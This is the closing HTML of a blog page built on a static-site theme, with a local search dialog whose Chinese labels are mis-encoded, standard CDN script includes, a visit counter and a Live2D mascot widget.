fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">æœ¬åœ°æœç´¢</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  æ•°æ®åº“åŠ è½½ä¸­</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="æœç´¢æ–‡ç« " type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":-15,"vOffset":-15},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>